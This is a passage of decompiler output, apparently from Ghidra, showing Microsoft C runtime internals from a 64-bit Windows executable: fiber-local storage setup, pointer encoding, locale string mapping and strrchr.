             _updatetlocinfoEx_nolock((longlong *)(pDVar1 + 0x30),(int *)PTR_DAT_14001ad00);
    FUN_14000fc60(0xc);
  }
  else {
    pDVar1 = FUN_14000b3d0();
    ptVar2 = *(pthreadlocinfo *)(pDVar1 + 0x30);
  }
  if (ptVar2 == (pthreadlocinfo)0x0) {
    _amsg_exit(0x20);
  }
  return ptVar2;
}




void FUN_14000af00(void)

{
  FUN_14000fc60(0xc);
  return;
}




INT_PTR FUN_14000af20(INT_PTR param_1)

{
  ushort uVar1;
  int iVar2;
  PVOID pvVar3;
  HMODULE hModule;
  HMODULE pHVar4;
  FARPROC pFVar5;
  longlong lVar6;
  char *pcVar7;
  uint uVar8;
  char *pcVar9;
  char *pcVar10;
  bool bVar11;
  int local_res8 [2];
  
  if ((DAT_14001ad20 == 0xffffffff) || (pvVar3 = FlsGetValue(DAT_14001ad20), pvVar3 == (PVOID)0x0))
  {
    hModule = GetModuleHandleA("KERNEL32.DLL");
    if (hModule == (HMODULE)0x0) {
      return param_1;
    }
    uVar8 = 0;
    local_res8[0] = 0;
    FUN_14000e060(local_res8);
    if (local_res8[0] < 6) {
      pHVar4 = GetModuleHandleA((LPCSTR)0x0);
      iVar2 = pHVar4[0xf].unused;
      pcVar7 = (char *)((longlong)&pHVar4[6].unused +
                       (longlong)iVar2 +
                       (ulonglong)*(ushort *)((longlong)&pHVar4[5].unused + (longlong)iVar2));
      uVar1 = *(ushort *)((longlong)&pHVar4[1].unused + (longlong)iVar2 + 2);
      bVar11 = uVar1 == 0;
      if (!bVar11) {
        do {
          lVar6 = 8;
          pcVar9 = ".mixcrt";
          pcVar10 = pcVar7;
          do {
            if (lVar6 == 0) break;
            lVar6 = lVar6 + -1;
            bVar11 = *pcVar9 == *pcVar10;
            pcVar9 = pcVar9 + 1;
            pcVar10 = pcVar10 + 1;
          } while (bVar11);
          if (bVar11) {
            return param_1;
          }
          uVar8 = uVar8 + 1;
          pcVar7 = pcVar7 + 0x28;
          bVar11 = uVar8 == uVar1;
        } while (uVar8 < uVar1);
      }
    }
    pFVar5 = GetProcAddress(hModule,"EncodePointer");
  }
  else {
    pFVar5 = *(FARPROC *)((longlong)pvVar3 + 0x2a8);
  }
  if (pFVar5 != (FARPROC)0x0) {
    param_1 = (*pFVar5)(param_1);
  }
  return param_1;
}




INT_PTR FUN_14000aff0(void)

{
  ushort uVar1;
  int iVar2;
  PVOID pvVar3;
  HMODULE hModule;
  HMODULE pHVar4;
  FARPROC pFVar5;
  INT_PTR IVar6;
  longlong lVar7;
  uint uVar8;
  char *pcVar9;
  char *pcVar10;
  char *pcVar11;
  bool bVar12;
  int local_res8 [2];
  
  if ((DAT_14001ad20 == 0xffffffff) || (pvVar3 = FlsGetValue(DAT_14001ad20), pvVar3 == (PVOID)0x0))
  {
    hModule = GetModuleHandleA("KERNEL32.DLL");
    if (hModule == (HMODULE)0x0) {
      return 0;
    }
    local_res8[0] = 0;
    FUN_14000e060(local_res8);
    if (local_res8[0] < 6) {
      pHVar4 = GetModuleHandleA((LPCSTR)0x0);
      uVar8 = 0;
      iVar2 = pHVar4[0xf].unused;
      pcVar11 = (char *)((longlong)&pHVar4[6].unused +
                        (longlong)iVar2 +
                        (ulonglong)*(ushort *)((longlong)&pHVar4[5].unused + (longlong)iVar2));
      uVar1 = *(ushort *)((longlong)&pHVar4[1].unused + (longlong)iVar2 + 2);
      bVar12 = uVar1 == 0;
      if (!bVar12) {
        do {
          lVar7 = 8;
          pcVar9 = ".mixcrt";
          pcVar10 = pcVar11;
          do {
            if (lVar7 == 0) break;
            lVar7 = lVar7 + -1;
            bVar12 = *pcVar9 == *pcVar10;
            pcVar9 = pcVar9 + 1;
            pcVar10 = pcVar10 + 1;
          } while (bVar12);
          if (bVar12) {
            return 0;
          }
          uVar8 = uVar8 + 1;
          pcVar11 = pcVar11 + 0x28;
          bVar12 = uVar8 == uVar1;
        } while (uVar8 < uVar1);
      }
    }
    pFVar5 = GetProcAddress(hModule,"EncodePointer");
  }
  else {
    pFVar5 = *(FARPROC *)((longlong)pvVar3 + 0x2a8);
  }
  if (pFVar5 == (FARPROC)0x0) {
    return 0;
  }
  IVar6 = (*pFVar5)(0);
  return IVar6;
}




INT_PTR FUN_14000b0e0(INT_PTR param_1)

{
  ushort uVar1;
  int iVar2;
  PVOID pvVar3;
  HMODULE hModule;
  HMODULE pHVar4;
  FARPROC pFVar5;
  longlong lVar6;
  char *pcVar7;
  uint uVar8;
  char *pcVar9;
  char *pcVar10;
  bool bVar11;
  int local_res8 [2];
  
  if ((DAT_14001ad20 == 0xffffffff) || (pvVar3 = FlsGetValue(DAT_14001ad20), pvVar3 == (PVOID)0x0))
  {
    hModule = GetModuleHandleA("KERNEL32.DLL");
    if (hModule == (HMODULE)0x0) {
      return param_1;
    }
    uVar8 = 0;
    local_res8[0] = 0;
    FUN_14000e060(local_res8);
    if (local_res8[0] < 6) {
      pHVar4 = GetModuleHandleA((LPCSTR)0x0);
      iVar2 = pHVar4[0xf].unused;
      pcVar7 = (char *)((longlong)&pHVar4[6].unused +
                       (longlong)iVar2 +
                       (ulonglong)*(ushort *)((longlong)&pHVar4[5].unused + (longlong)iVar2));
      uVar1 = *(ushort *)((longlong)&pHVar4[1].unused + (longlong)iVar2 + 2);
      bVar11 = uVar1 == 0;
      if (!bVar11) {
        do {
          lVar6 = 8;
          pcVar9 = ".mixcrt";
          pcVar10 = pcVar7;
          do {
            if (lVar6 == 0) break;
            lVar6 = lVar6 + -1;
            bVar11 = *pcVar9 == *pcVar10;
            pcVar9 = pcVar9 + 1;
            pcVar10 = pcVar10 + 1;
          } while (bVar11);
          if (bVar11) {
            return param_1;
          }
          uVar8 = uVar8 + 1;
          pcVar7 = pcVar7 + 0x28;
          bVar11 = uVar8 == uVar1;
        } while (uVar8 < uVar1);
      }
    }
    pFVar5 = GetProcAddress(hModule,"DecodePointer");
  }
  else {
    pFVar5 = *(FARPROC *)((longlong)pvVar3 + 0x2b0);
  }
  if (pFVar5 != (FARPROC)0x0) {
    param_1 = (*pFVar5)(param_1);
  }
  return param_1;
}




void FUN_14000b1b0(longlong param_1,longlong param_2)

{
  ushort uVar1;
  int iVar2;
  HMODULE hModule;
  HMODULE pHVar3;
  FARPROC pFVar4;
  longlong lVar5;
  char *pcVar6;
  uint uVar7;
  char *pcVar8;
  char *pcVar9;
  bool bVar10;
  int local_res8 [2];
  
  hModule = GetModuleHandleA("KERNEL32.DLL");
  *(undefined **)(param_1 + 0xa0) = &DAT_14001aee0;
  *(undefined4 *)(param_1 + 0x1c) = 1;
  if (hModule != (HMODULE)0x0) {
    uVar7 = 0;
    local_res8[0] = 0;
    FUN_14000e060(local_res8);
    if (local_res8[0] < 6) {
      pHVar3 = GetModuleHandleA((LPCSTR)0x0);
      iVar2 = pHVar3[0xf].unused;
      pcVar6 = (char *)((longlong)&pHVar3[6].unused +
                       (longlong)iVar2 +
                       (ulonglong)*(ushort *)((longlong)&pHVar3[5].unused + (longlong)iVar2));
      uVar1 = *(ushort *)((longlong)&pHVar3[1].unused + (longlong)iVar2 + 2);
      bVar10 = uVar1 == 0;
      if (!bVar10) {
        do {
          lVar5 = 8;
          pcVar8 = ".mixcrt";
          pcVar9 = pcVar6;
          do {
            if (lVar5 == 0) break;
            lVar5 = lVar5 + -1;
            bVar10 = *pcVar8 == *pcVar9;
            pcVar8 = pcVar8 + 1;
            pcVar9 = pcVar9 + 1;
          } while (bVar10);
          if (bVar10) goto LAB_14000b28e;
          uVar7 = uVar7 + 1;
          pcVar6 = pcVar6 + 0x28;
          bVar10 = uVar7 == uVar1;
        } while (uVar7 < uVar1);
      }
    }
    pFVar4 = GetProcAddress(hModule,"EncodePointer");
    *(FARPROC *)(param_1 + 0x2a8) = pFVar4;
    pFVar4 = GetProcAddress(hModule,"DecodePointer");
    *(FARPROC *)(param_1 + 0x2b0) = pFVar4;
  }
LAB_14000b28e:
  *(undefined4 *)(param_1 + 200) = 1;
  *(undefined1 *)(param_1 + 0x174) = 0x43;
  *(undefined1 *)(param_1 + 0x1f7) = 0x43;
  *(int **)(param_1 + 0xb8) = &DAT_14001a650;
  LOCK();
  DAT_14001a650 = DAT_14001a650 + 1;
  UNLOCK();
  _lock(0xc);
  *(longlong *)(param_1 + 0xc0) = param_2;
  if (param_2 == 0) {
    *(undefined **)(param_1 + 0xc0) = PTR_DAT_14001ad00;
  }
  __addlocaleref(*(int **)(param_1 + 0xc0));
  FUN_14000fc60(0xc);
  return;
}




void FUN_14000b320(void)

{
  FUN_14000fc60(0xc);
  return;
}




DWORD * FUN_14000b340(void)

{
  DWORD dwErrCode;
  BOOL BVar1;
  DWORD DVar2;
  DWORD *lpFlsData;
  
  dwErrCode = GetLastError();
  lpFlsData = (DWORD *)FlsGetValue(DAT_14001ad20);
  if (lpFlsData == (DWORD *)0x0) {
    lpFlsData = (DWORD *)FUN_14000f670(1,0x2d8);
    if (lpFlsData != (DWORD *)0x0) {
      BVar1 = FlsSetValue(DAT_14001ad20,lpFlsData);
      if (BVar1 == 0) {
        FUN_14000b9c0(lpFlsData);
        lpFlsData = (DWORD *)0x0;
      }
      else {
        FUN_14000b1b0((longlong)lpFlsData,0);
        DVar2 = GetCurrentThreadId();
        lpFlsData[2] = 0xffffffff;
        lpFlsData[3] = 0xffffffff;
        *lpFlsData = DVar2;
      }
    }
  }
  SetLastError(dwErrCode);
  return lpFlsData;
}




DWORD * FUN_14000b3d0(void)

{
  DWORD dwErrCode;
  BOOL BVar1;
  DWORD DVar2;
  DWORD *lpFlsData;
  
  dwErrCode = GetLastError();
  lpFlsData = (DWORD *)FlsGetValue(DAT_14001ad20);
  if (lpFlsData == (DWORD *)0x0) {
    lpFlsData = (DWORD *)FUN_14000f670(1,0x2d8);
    if (lpFlsData != (DWORD *)0x0) {
      BVar1 = FlsSetValue(DAT_14001ad20,lpFlsData);
      if (BVar1 == 0) {
        FUN_14000b9c0(lpFlsData);
        lpFlsData = (DWORD *)0x0;
      }
      else {
        FUN_14000b1b0((longlong)lpFlsData,0);
        DVar2 = GetCurrentThreadId();
        lpFlsData[2] = 0xffffffff;
        lpFlsData[3] = 0xffffffff;
        *lpFlsData = DVar2;
      }
    }
  }
  SetLastError(dwErrCode);
  if (lpFlsData == (DWORD *)0x0) {
    _amsg_exit(0x10);
  }
  return lpFlsData;
}




void FUN_14000b5a0(void)

{
  FUN_14000fc60(0xd);
  return;
}




void FUN_14000b5c0(void)

{
  FUN_14000fc60(0xc);
  return;
}




undefined8 FUN_14000b5e0(void)

{
  BOOL BVar1;
  DWORD DVar2;
  undefined8 uVar3;
  DWORD *lpFlsData;
  
  _init_pointers();
  uVar3 = FUN_14000fb20();
  if ((int)uVar3 == 0) {
    if (DAT_14001ad20 != 0xffffffff) {
      FlsFree(DAT_14001ad20);
      DAT_14001ad20 = 0xffffffff;
    }
  }
  else {
    DAT_14001ad20 = FlsAlloc((PFLS_CALLBACK_FUNCTION)&LAB_14000b470);
    if (DAT_14001ad20 != 0xffffffff) {
      lpFlsData = (DWORD *)FUN_14000f670(1,0x2d8);
      if ((lpFlsData != (DWORD *)0x0) && (BVar1 = FlsSetValue(DAT_14001ad20,lpFlsData), BVar1 != 0))
      {
        FUN_14000b1b0((longlong)lpFlsData,0);
        DVar2 = GetCurrentThreadId();
        lpFlsData[2] = 0xffffffff;
        lpFlsData[3] = 0xffffffff;
        *lpFlsData = DVar2;
        return 1;
      }
      if (DAT_14001ad20 != 0xffffffff) {
        FlsFree(DAT_14001ad20);
        DAT_14001ad20 = 0xffffffff;
      }
      if (DAT_14001ad24 != 0xffffffff) {
        TlsFree(DAT_14001ad24);
        DAT_14001ad24 = 0xffffffff;
      }
      FUN_14000fbc0();
      return 0;
    }
    DAT_14001ad20 = 0xffffffff;
  }
  if (DAT_14001ad24 != 0xffffffff) {
    TlsFree(DAT_14001ad24);
    DAT_14001ad24 = 0xffffffff;
  }
  FUN_14000fbc0();
  return 0;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

uint FUN_14000b700(uint param_1,undefined8 *param_2)

{
  byte bVar1;
  ushort uVar2;
  uint uVar3;
  int iVar4;
  undefined6 extraout_var;
  undefined6 extraout_var_00;
  DWORD *pDVar5;
  CHAR local_res8;
  CHAR local_res9;
  undefined1 local_resa;
  byte local_res10;
  undefined1 local_res11;
  pthreadlocinfo local_28;
  pthreadmbcinfo local_20;
  DWORD *local_18;
  char local_10;
  
  local_10 = '\0';
  if (param_2 == (undefined8 *)0x0) {
    local_18 = FUN_14000b3d0();
    local_28 = *(pthreadlocinfo *)(local_18 + 0x30);
    local_20 = *(pthreadmbcinfo *)(local_18 + 0x2e);
    if ((local_28 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & local_18[0x32]) == 0))
    {
      local_28 = __updatetlocinfo();
    }
    if ((local_20 != (pthreadmbcinfo)PTR_DAT_14001aa80) && ((_DAT_14001ab88 & local_18[0x32]) == 0))
    {
      local_20 = __updatetmbcinfo();
    }
    if ((local_18[0x32] & 2) == 0) {
      local_18[0x32] = local_18[0x32] | 2;
      local_10 = '\x01';
    }
  }
  else {
    local_28 = (pthreadlocinfo)*param_2;
    local_20 = (pthreadmbcinfo)param_2[1];
  }
  if (0xff < param_1) {
    if ((*(int *)((longlong)&local_28->pctype + 4) < 2) ||
       (uVar2 = FUN_1400101b0((int)param_1 >> 8 & 0xff,&local_28),
       (int)CONCAT62(extraout_var_00,uVar2) == 0)) {
      pDVar5 = FUN_140009c00();
      uVar3 = 1;
      *pDVar5 = 0x2a;
      local_res9 = '\0';
      local_res8 = (CHAR)param_1;
    }
    else {
      local_resa = 0;
      uVar3 = 2;
      local_res8 = (CHAR)(param_1 >> 8);
      local_res9 = (CHAR)param_1;
    }
    iVar4 = FUN_14000bf50((longlong *)&local_28,
                          *(LCID *)((longlong)&local_28->lc_category[0].locale + 4),0x100,
                          &local_res8,uVar3,(LPSTR)&local_res10,3,local_28->lc_codepage,1);
    if (iVar4 != 0) {
      if (iVar4 == 1) {
        uVar3 = (uint)local_res10;
      }
      else {
        uVar3 = (uint)CONCAT11(local_res10,local_res11);
      }
      if (local_10 != '\0') {
        local_18[0x32] = local_18[0x32] & 0xfffffffd;
      }
      return uVar3;
    }
    if (local_10 != '\0') {
      local_18[0x32] = local_18[0x32] & 0xfffffffd;
    }
    return param_1;
  }
  if (*(int *)((longlong)&local_28->pctype + 4) < 2) {
    uVar3 = (byte)local_28->locale_name[3][(int)param_1] & 1;
  }
  else {
    uVar2 = FUN_1400129a0(param_1,1,&local_28);
    uVar3 = (uint)CONCAT62(extraout_var,uVar2);
  }
  if (uVar3 != 0) {
    bVar1 = *(byte *)((longlong)local_28->locale_name[4] + (longlong)(int)param_1);
    if (local_10 == '\0') {
      return (uint)bVar1;
    }
    local_18[0x32] = local_18[0x32] & 0xfffffffd;
    return (uint)bVar1;
  }
  if (local_10 != '\0') {
    local_18[0x32] = local_18[0x32] & 0xfffffffd;
  }
  return param_1;
}




void FUN_14000b970(__uint64 param_1)

{
  operator_new(param_1);
  return;
}




undefined * Catch_All_14000b990(undefined8 param_1,longlong param_2)

{
  *(undefined8 *)(param_2 + 0x50) = 0;
  return &DAT_14000b985;
}




void FUN_14000b9c0(LPVOID param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  DWORD *pDVar3;
  
  if (param_1 != (LPVOID)0x0) {
    BVar1 = HeapFree(DAT_14001c0e0,0,param_1);
    if (BVar1 == 0) {
      pDVar3 = FUN_140009c00();
      DVar2 = GetLastError();
      DVar2 = FUN_140009bb0(DVar2);
      *pDVar3 = DVar2;
    }
  }
  return;
}




/* WARNING: Function: __chkstk replaced with injection: alloca_probe */

void FUN_14000ba10(longlong *param_1,LCID param_2,DWORD param_3,LPCSTR param_4,uint param_5,
                  LPSTR param_6,int param_7,UINT param_8,int param_9)

{
  bool bVar1;
  undefined1 auVar2 [16];
  undefined1 auVar3 [16];
  longlong lVar4;
  LPSTR pCVar5;
  LCID Locale;
  int iVar6;
  DWORD DVar7;
  uint uVar8;
  int iVar9;
  UINT UVar10;
  ulonglong uVar11;
  LPCWSTR lpSrcStr;
  LPCWSTR lpWideCharStr;
  LPCSTR pCVar12;
  ulonglong *puVar13;
  LPSTR pCVar14;
  uint uVar15;
  char *pcVar16;
  size_t sVar17;
  ulonglong uVar18;
  undefined1 *puVar19;
  undefined1 *puVar20;
  undefined1 *puVar21;
  undefined1 *puVar22;
  LPSTR pCVar23;
  UINT UVar24;
  undefined1 auStackY_88 [32];
  ulonglong local_48;
  LPCSTR local_40;
  LCID local_38;
  ulonglong local_30;
  
  puVar19 = auStackY_88;
  puVar20 = auStackY_88;
  puVar22 = auStackY_88;
  local_30 = DAT_14001a0b0 ^ (ulonglong)&local_48;
  pCVar14 = (LPSTR)0x0;
  local_48._0_4_ = param_3;
  local_40 = param_4;
  local_38 = param_2;
  if (DAT_14001bc20 == 0) {
    iVar6 = LCMapStringW(0,0x100,L"",1,(LPWSTR)0x0,0);
    if (iVar6 == 0) {
      DVar7 = GetLastError();
      if (DVar7 == 0x78) {
        DAT_14001bc20 = 2;
      }
    }
    else {
      DAT_14001bc20 = 1;
    }
  }
  pcVar16 = param_4;
  uVar8 = param_5;
  if (0 < (int)param_5) {
    do {
      uVar8 = uVar8 - 1;
      if (*pcVar16 == '\0') goto LAB_14000bad2;
      pcVar16 = pcVar16 + 1;
    } while (uVar8 != 0);
    uVar8 = 0xffffffff;
LAB_14000bad2:
    uVar8 = param_5 - uVar8;
    uVar15 = uVar8 - 1;
    bVar1 = (int)uVar15 < (int)param_5;
    param_5 = uVar15;
    if (bVar1) {
      param_5 = uVar8;
    }
  }
  if ((DAT_14001bc20 == 2) || (DAT_14001bc20 == 0)) {
    if (param_2 == 0) {
      param_2 = *(LCID *)(*param_1 + 0x14);
      local_38 = param_2;
    }
    UVar24 = param_8;
    if (param_8 == 0) {
      UVar24 = *(UINT *)(*param_1 + 4);
    }
    UVar10 = FUN_140012b90(param_2);
    puVar21 = auStackY_88;
    if (UVar10 == 0xffffffff) goto LAB_14000bf26;
    if (UVar10 == UVar24) {
      LCMapStringA(param_2,(DWORD)local_48,param_4,param_5,param_6,param_7);
      puVar21 = auStackY_88;
      goto LAB_14000bf26;
    }
    pCVar12 = (LPCSTR)FUN_140012c00(UVar24,UVar10,param_4,&param_5,0,0);
    puVar21 = auStackY_88;
    if (pCVar12 == (LPCSTR)0x0) goto LAB_14000bf26;
    iVar6 = LCMapStringA(param_2,(DWORD)local_48,pCVar12,param_5,(LPSTR)0x0,0);
    pCVar5 = param_6;
    uVar18 = (ulonglong)iVar6;
    local_40 = (LPCSTR)CONCAT44(local_40._4_4_,iVar6);
    puVar20 = auStackY_88;
    pCVar23 = pCVar14;
    if ((0 < iVar6) && (puVar20 = auStackY_88, uVar18 < 0xffffffffffffffe1)) {
      sVar17 = uVar18 + 0x10;
      pCVar23 = (LPSTR)0x0;
      if (sVar17 < 0x401) {
        uVar18 = uVar18 + 0x1f;
        if (uVar18 <= sVar17) {
          uVar18 = 0xffffffffffffff0;
        }
        lVar4 = -(uVar18 & 0xfffffffffffffff0);
        puVar20 = auStackY_88 + lVar4;
        puVar22 = auStackY_88 + lVar4;
        puVar13 = (ulonglong *)((longlong)&local_48 + lVar4);
        if (puVar13 == (ulonglong *)0x0) goto LAB_14000bee3;
        *(undefined4 *)puVar13 = 0xcccc;
LAB_14000be61:
        puVar13 = puVar13 + 2;
        puVar20 = puVar22;
      }
      else {
        puVar13 = (ulonglong *)FUN_14000dc10(sVar17);
        puVar20 = auStackY_88;
        if (puVar13 != (ulonglong *)0x0) {
          *(undefined4 *)puVar13 = 0xdddd;
          goto LAB_14000be61;
        }
      }
      if (puVar13 != (ulonglong *)0x0) {
        uVar18 = (ulonglong)(int)local_40;
        *(undefined8 *)(puVar20 + -8) = 0x14000be7b;
        FUN_140006070(puVar13,0,uVar18);
        Locale = local_38;
        DVar7 = (DWORD)local_48;
        *(int *)(puVar20 + 0x28) = (int)local_40;
        *(ulonglong **)(puVar20 + 0x20) = puVar13;
        *(undefined8 *)(puVar20 + -8) = 0x14000be9c;
        iVar6 = LCMapStringA(Locale,DVar7,pCVar12,param_5,*(LPSTR *)(puVar20 + 0x20),
                             *(int *)(puVar20 + 0x28));
        local_40 = (LPCSTR)CONCAT44(local_40._4_4_,iVar6);
        if (iVar6 != 0) {
          *(int *)(puVar20 + 0x28) = param_7;
          *(LPSTR *)(puVar20 + 0x20) = pCVar5;
          *(undefined8 *)(puVar20 + -8) = 0x14000bec3;
          pCVar14 = (LPSTR)FUN_140012c00(UVar10,UVar24,(LPCSTR)puVar13,(uint *)&local_40,
                                         *(longlong *)(puVar20 + 0x20),
                                         *(undefined4 *)(puVar20 + 0x28));
        }
        pCVar23 = pCVar14;
        if ((int)puVar13[-2] == 0xdddd) {
          *(undefined8 *)(puVar20 + -8) = 0x14000bee3;
          FUN_14000b9c0(puVar13 + -2);
        }
      }
    }
LAB_14000bee3:
    *(undefined8 *)(puVar20 + -8) = 0x14000beeb;
    FUN_14000b9c0(pCVar12);
    puVar21 = puVar20;
    if ((pCVar23 != (LPSTR)0x0) && (pCVar5 != pCVar23)) {
      *(undefined8 *)(puVar20 + -8) = 0x14000befd;
      FUN_14000b9c0(pCVar23);
    }
    goto LAB_14000bf26;
  }
  puVar21 = auStackY_88;
  if (DAT_14001bc20 != 1) goto LAB_14000bf26;
  UVar24 = param_8;
  if (param_8 == 0) {
    UVar24 = *(UINT *)(*param_1 + 4);
  }
  DVar7 = 1;
  if (param_9 != 0) {
    DVar7 = 9;
  }
  iVar6 = MultiByteToWideChar(UVar24,DVar7,param_4,param_5,(LPWSTR)0x0,0);
  puVar21 = auStackY_88;
  if (((iVar6 == 0) || (puVar21 = auStackY_88, iVar6 < 1)) ||
     (auVar2._8_8_ = 0, auVar2._0_8_ = (longlong)iVar6, puVar21 = auStackY_88,
     SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffe0)) / auVar2,0) < 2)) goto LAB_14000bf26;
  lVar4 = (longlong)iVar6 * 2;
  uVar18 = lVar4 + 0x10;
  if (uVar18 < 0x401) {
    uVar11 = lVar4 + 0x1f;
    if (uVar11 <= uVar18) {
      uVar11 = 0xffffffffffffff0;
    }
    lVar4 = -(uVar11 & 0xfffffffffffffff0);
    puVar19 = auStackY_88 + lVar4;
    lpSrcStr = (LPCWSTR)((longlong)&local_48 + lVar4);
    puVar21 = auStackY_88 + lVar4;
    if (lpSrcStr == (LPCWSTR)0x0) goto LAB_14000bf26;
    lpSrcStr[0] = L'쳌';
    lpSrcStr[1] = L'\0';
LAB_14000bbca:
    lpSrcStr = lpSrcStr + 8;
    puVar20 = puVar19;
  }
  else {
    lpSrcStr = (LPCWSTR)FUN_14000dc10(uVar18);
    if (lpSrcStr != (LPCWSTR)0x0) {
      lpSrcStr[0] = L'\xdddd';
      lpSrcStr[1] = L'\0';
      goto LAB_14000bbca;
    }
  }
  pCVar12 = local_40;
  puVar21 = puVar20;
  if (lpSrcStr == (LPCWSTR)0x0) goto LAB_14000bf26;
  *(int *)(puVar20 + 0x28) = iVar6;
  *(LPCWSTR *)(puVar20 + 0x20) = lpSrcStr;
  *(undefined8 *)(puVar20 + -8) = 0x14000bbf7;
  iVar9 = MultiByteToWideChar(UVar24,1,pCVar12,param_5,*(LPWSTR *)(puVar20 + 0x20),
                              *(int *)(puVar20 + 0x28));
  DVar7 = (DWORD)local_48;
  if (iVar9 != 0) {
    *(undefined4 *)(puVar20 + 0x28) = 0;
    *(undefined8 *)(puVar20 + 0x20) = 0;
    *(undefined8 *)(puVar20 + -8) = 0x14000bc1a;
    iVar9 = LCMapStringW(param_2,DVar7,lpSrcStr,iVar6,*(LPWSTR *)(puVar20 + 0x20),
                         *(int *)(puVar20 + 0x28));
    uVar8 = (DWORD)local_48;
    if (iVar9 != 0) {
      if (((DWORD)local_48 >> 10 & 1) == 0) {
        if ((0 < iVar9) &&
           (auVar3._8_8_ = 0, auVar3._0_8_ = (longlong)iVar9,
           1 < SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffe0)) / auVar3,0))) {
          lVar4 = (longlong)iVar9 * 2;
          uVar18 = lVar4 + 0x10;
          if (uVar18 < 0x401) {
            uVar11 = lVar4 + 0x1f;
            if (uVar11 <= uVar18) {
              uVar11 = 0xffffffffffffff0;
            }
            *(undefined8 *)(puVar20 + -8) = 0x14000bca9;
            lVar4 = -(uVar11 & 0xfffffffffffffff0);
            puVar21 = puVar20 + lVar4;
            lpWideCharStr = (LPCWSTR)(puVar20 + lVar4 + 0x40);
            if (lpWideCharStr == (LPCWSTR)0x0) goto LAB_14000bd50;
            lpWideCharStr[0] = L'쳌';
            lpWideCharStr[1] = L'\0';
            puVar20 = puVar20 + lVar4;
LAB_14000bcd5:
            lpWideCharStr = lpWideCharStr + 8;
            puVar21 = puVar20;
          }
          else {
            *(undefined8 *)(puVar20 + -8) = 0x14000bcc7;
            lpWideCharStr = (LPCWSTR)FUN_14000dc10(uVar18);
            if (lpWideCharStr != (LPCWSTR)0x0) {
              lpWideCharStr[0] = L'\xdddd';
              lpWideCharStr[1] = L'\0';
              goto LAB_14000bcd5;
            }
          }
          DVar7 = (DWORD)local_48;
          if (lpWideCharStr != (LPCWSTR)0x0) {
            *(int *)(puVar21 + 0x28) = iVar9;
            *(LPCWSTR *)(puVar21 + 0x20) = lpWideCharStr;
            *(undefined8 *)(puVar21 + -8) = 0x14000bcfa;
            iVar6 = LCMapStringW(param_2,DVar7,lpSrcStr,iVar6,*(LPWSTR *)(puVar21 + 0x20),
                                 *(int *)(puVar21 + 0x28));
            if (iVar6 != 0) {
              *(undefined8 *)(puVar21 + 0x38) = 0;
              *(undefined8 *)(puVar21 + 0x30) = 0;
              if (param_7 == 0) {
                *(undefined4 *)(puVar21 + 0x28) = 0;
                *(undefined8 *)(puVar21 + 0x20) = 0;
              }
              else {
                *(int *)(puVar21 + 0x28) = param_7;
                *(LPSTR *)(puVar21 + 0x20) = param_6;
              }
              *(undefined8 *)(puVar21 + -8) = 0x14000bd3b;
              WideCharToMultiByte(UVar24,0,lpWideCharStr,iVar9,*(LPSTR *)(puVar21 + 0x20),
                                  *(int *)(puVar21 + 0x28),*(LPCSTR *)(puVar21 + 0x30),
                                  *(LPBOOL *)(puVar21 + 0x38));
            }
            if (*(int *)(lpWideCharStr + -8) == 0xdddd) {
              *(undefined8 *)(puVar21 + -8) = 0x14000bd50;
              FUN_14000b9c0(lpWideCharStr + -8);
            }
          }
        }
      }
      else if ((param_7 != 0) && (iVar9 <= param_7)) {
        *(int *)(puVar20 + 0x28) = param_7;
        *(LPSTR *)(puVar20 + 0x20) = param_6;
        *(undefined8 *)(puVar20 + -8) = 0x14000bc63;
        LCMapStringW(param_2,uVar8,lpSrcStr,iVar6,*(LPWSTR *)(puVar20 + 0x20),
                     *(int *)(puVar20 + 0x28));
      }
    }
  }
LAB_14000bd50:
  if (*(int *)(lpSrcStr + -8) == 0xdddd) {
    *(undefined8 *)(puVar21 + -8) = 0x14000bd62;
    FUN_14000b9c0(lpSrcStr + -8);
  }
LAB_14000bf26:
  uVar18 = local_30 ^ (ulonglong)&local_48;
  *(undefined8 *)(puVar21 + -8) = 0x14000bf32;
  __security_check_cookie(uVar18);
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000bf50(longlong *param_1,LCID param_2,DWORD param_3,LPCSTR param_4,uint param_5,
                  LPSTR param_6,int param_7,UINT param_8,int param_9)

{
  pthreadmbcinfo ptVar1;
  bool bVar2;
  DWORD *pDVar3;
  pthreadlocinfo local_38;
  pthreadmbcinfo local_30;
  DWORD *local_28;
  undefined1 local_20;
  
  bVar2 = false;
  local_20 = 0;
  if (param_1 == (longlong *)0x0) {
    pDVar3 = FUN_14000b3d0();
    local_38 = *(pthreadlocinfo *)(pDVar3 + 0x30);
    ptVar1 = *(pthreadmbcinfo *)(pDVar3 + 0x2e);
    local_30 = ptVar1;
    local_28 = pDVar3;
    if ((local_38 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & pDVar3[0x32]) == 0)) {
      local_38 = __updatetlocinfo();
    }
    if ((ptVar1 != (pthreadmbcinfo)PTR_DAT_14001aa80) && ((_DAT_14001ab88 & pDVar3[0x32]) == 0)) {
      local_30 = __updatetmbcinfo();
    }
    if ((pDVar3[0x32] & 2) == 0) {
      pDVar3[0x32] = pDVar3[0x32] | 2;
      bVar2 = true;
      local_20 = 1;
    }
  }
  else {
    local_38 = (pthreadlocinfo)*param_1;
    local_30 = (pthreadmbcinfo)param_1[1];
    bVar2 = false;
    pDVar3 = local_28;
  }
  FUN_14000ba10((longlong *)&local_38,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
                param_9);
  if (bVar2) {
    pDVar3[0x32] = pDVar3[0x32] & 0xfffffffd;
  }
  return;
}




/* Library Function - Single Match
    strrchr
   
   Library: Visual Studio 2005 Release */

char * __cdecl strrchr(char *_Str,int _Ch)

{
  char cVar1;
  char *pcVar2;
  
  pcVar2 = _Str;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  do {
    pcVar2 = pcVar2 + -1;
    if (pcVar2 == _Str) {
      if (*pcVar2 == (char)_Ch) {
        return pcVar2;
      }
      return (char *)0x0;
    }
  } while (*pcVar2 != (char)_Ch);
  return pcVar2;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000c0e0(void)

{
  _DAT_14001c710 = 0;
  return;
}




undefined4 FUN_14000c0f0(longlong param_1,longlong param_2,longlong param_3)

{
